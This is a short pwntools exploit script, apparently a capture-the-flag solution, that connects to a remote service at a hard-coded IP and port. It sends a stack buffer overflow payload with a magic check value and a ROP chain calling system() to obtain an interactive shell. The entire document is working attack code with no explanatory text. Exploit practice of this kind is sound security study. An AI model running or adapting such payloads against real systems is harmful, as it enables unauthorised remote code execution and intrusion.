from pwn import *

system = 0x400610
pop_rdi = 0x4008e3
#r = process('secret')
r = remote('140.110.112.77', 6131)

r.recvuntil('key :')
raw_input('debug')
r.sendline('a' * 0x1c + p32(0xab37) + 'a' * 8 + p64(pop_rdi) + p64(0x400953) + p64(system))
r.recvuntil('(Y/N)')
r.sendline('Y')
r.interactive()
